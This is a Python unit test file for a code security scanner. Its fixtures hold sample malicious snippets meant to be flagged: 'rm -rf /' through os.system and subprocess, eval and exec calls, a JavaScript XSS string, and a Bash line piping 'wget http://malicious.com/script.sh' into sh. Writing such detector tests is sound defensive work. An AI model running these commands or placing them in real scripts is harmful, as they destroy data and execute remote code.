"""Unit tests for AST Scanner."""

import pytest

from capibara.models.manifests import ResourceLimits, SecurityPolicy, SecurityRule
from capibara.security.ast_scanner import ASTScanner


class TestASTScanner:
    """Test cases for ASTScanner."""

    @pytest.fixture
    def scanner(self):
        """Create ASTScanner instance."""
        return ASTScanner()

    @pytest.fixture
    def sample_policy(self):
        """Create sample security policy."""
        return SecurityPolicy(
            name="test_policy",
            description="Test policy",
            rules=[
                SecurityRule(
                    name="test_rule",
                    description="Test rule",
                    pattern=r"test_pattern",
                    severity="error",
                    action="block",
                )
            ],
            blocked_imports=["dangerous_module"],
            blocked_functions=["dangerous_function"],
            allowed_imports=[],
            allowed_functions=[],
            resource_limits=ResourceLimits(
                cpu_time_seconds=30,
                memory_mb=256,
                execution_time_seconds=60,
                max_file_size_mb=5,
                max_files=50,
                network_access=False,
                allow_subprocess=False,
            ),
        )

    @pytest.mark.asyncio
    async def test_scan_python_safe_code(self, scanner):
        """Test scanning safe Python code."""
        # Arrange
        safe_code = """
def hello_world():
    print("Hello, World!")
    return "success"

if __name__ == "__main__":
    result = hello_world()
    print(result)
"""

        # Act
        result = await scanner.scan(safe_code, "python")

        # Assert
        assert result.passed is True
        assert len(result.violations) == 0
        assert result.scan_id is not None

    @pytest.mark.asyncio
    async def test_scan_python_dangerous_import(self, scanner):
        """Test scanning Python code with dangerous import."""
        # Arrange
        dangerous_code = """
import os
import subprocess

def dangerous_function():
    os.system("rm -rf /")
    subprocess.run(["rm", "-rf", "/"])
"""

        # Act
        result = await scanner.scan(dangerous_code, "python")

        # Assert
        assert result.passed is False
        assert len(result.violations) > 0

        # Check for dangerous import violations
        import_violations = [
            v for v in result.violations if v.rule_name == "dangerous_import"
        ]
        assert len(import_violations) > 0

        # Check specific dangerous modules are detected
        dangerous_modules = {v.pattern_matched for v in import_violations}
        assert "os" in dangerous_modules
        assert "subprocess" in dangerous_modules

    @pytest.mark.asyncio
    async def test_scan_python_dangerous_functions(self, scanner):
        """Test scanning Python code with dangerous functions."""
        # Arrange
        dangerous_code = """
def test_function():
    eval("print('Hello')")
    exec("import os")
    result = compile("1+1", "<string>", "eval")
    module = __import__("os")
"""

        # Act
        result = await scanner.scan(dangerous_code, "python")

        # Assert
        assert result.passed is False
        assert len(result.violations) > 0

        # Check for dangerous function violations
        function_violations = [
            v for v in result.violations if v.rule_name == "dangerous_function"
        ]
        assert len(function_violations) > 0

        # Check specific dangerous functions are detected
        dangerous_functions = {v.pattern_matched for v in function_violations}
        assert "eval" in dangerous_functions
        assert "exec" in dangerous_functions
        assert "compile" in dangerous_functions
        assert "__import__" in dangerous_functions

    @pytest.mark.asyncio
    async def test_scan_python_syntax_error(self, scanner):
        """Test scanning Python code with syntax error."""
        # Arrange
        syntax_error_code = """
def broken_function(
    print("This is broken")
"""

        # Act
        result = await scanner.scan(syntax_error_code, "python")

        # Assert
        assert result.passed is False
        assert len(result.violations) == 1
        assert result.violations[0].rule_name == "syntax_error"
        assert "syntax error" in result.violations[0].message.lower()

    @pytest.mark.asyncio
    async def test_scan_javascript_dangerous_patterns(self, scanner):
        """Test scanning JavaScript code with dangerous patterns."""
        # Arrange
        dangerous_js_code = """
function dangerousFunction() {
    eval("console.log('Hello')");
    setTimeout("alert('Hello')", 1000);
    document.write("<script>alert('XSS')</script>");
    element.innerHTML = userInput;
}
"""

        # Act
        result = await scanner.scan(dangerous_js_code, "javascript")

        # Assert
        assert result.passed is False
        assert len(result.violations) > 0

        # Check for JavaScript-specific violations
        js_violations = [
            v
            for v in result.violations
            if "JavaScript" in v.message or "dangerous" in v.message.lower()
        ]
        assert len(js_violations) > 0

    @pytest.mark.asyncio
    async def test_scan_bash_dangerous_patterns(self, scanner):
        """Test scanning Bash code with dangerous patterns."""
        # Arrange
        dangerous_bash_code = """
#!/bin/bash
rm -rf /
mkdir /dangerous
chmod 777 /tmp
wget http://malicious.com/script.sh | sh
"""

        # Act
        result = await scanner.scan(dangerous_bash_code, "bash")

        # Assert
        assert result.passed is False
        assert len(result.violations) > 0

        # Check for Bash-specific violations
        bash_violations = [
            v
            for v in result.violations
            if "Bash" in v.message or "bash" in v.message.lower()
        ]
        assert len(bash_violations) > 0

    @pytest.mark.asyncio
    async def test_scan_with_custom_policy(self, scanner, sample_policy):
        """Test scanning with custom security policy."""
        # Arrange
        code_with_custom_pattern = """
def test_function():
    # This should trigger our custom policy rule
    test_pattern = "some_value"
"""

        # Act
        result = await scanner.scan(code_with_custom_pattern, "python", sample_policy)

        # Assert
        # The custom policy should detect the test_pattern
        assert result.passed is False
        assert len(result.violations) > 0

        # Check for custom rule violations
        custom_violations = [v for v in result.violations if v.rule_name == "test_rule"]
        assert len(custom_violations) > 0

    @pytest.mark.asyncio
    async def test_scan_unsupported_language(self, scanner):
        """Test scanning unsupported language."""
        # Arrange
        code = "some random code"

        # Act
        result = await scanner.scan(code, "unknown_language")

        # Assert
        # Should fall back to generic scanning
        assert result.scan_id is not None
        # Result may pass or fail depending on generic patterns

    def test_get_applied_rules(self, scanner, sample_policy):
        """Test getting applied rules."""
        # Act
        rules = scanner._get_applied_rules(sample_policy)

        # Assert
        assert "dangerous_import" in rules
        assert "dangerous_function" in rules
        assert "dangerous_pattern" in rules
        assert "test_rule" in rules

    def test_get_applied_rules_no_policy(self, scanner):
        """Test getting applied rules without policy."""
        # Act
        rules = scanner._get_applied_rules(None)

        # Assert
        assert "dangerous_import" in rules
        assert "dangerous_function" in rules
        assert "dangerous_pattern" in rules
        assert len(rules) == 3

    def test_is_import_allowed(self, scanner, sample_policy):
        """Test import allowance checking."""
        # Test blocked import
        assert not scanner._is_import_allowed("dangerous_module", sample_policy)

        # Test allowed import (not in blocked list)
        assert scanner._is_import_allowed("safe_module", sample_policy)

    def test_is_function_allowed(self, scanner, sample_policy):
        """Test function allowance checking."""
        # Test blocked function
        assert not scanner._is_function_allowed("dangerous_function", sample_policy)

        # Test allowed function (not in blocked list)
        assert scanner._is_function_allowed("safe_function", sample_policy)
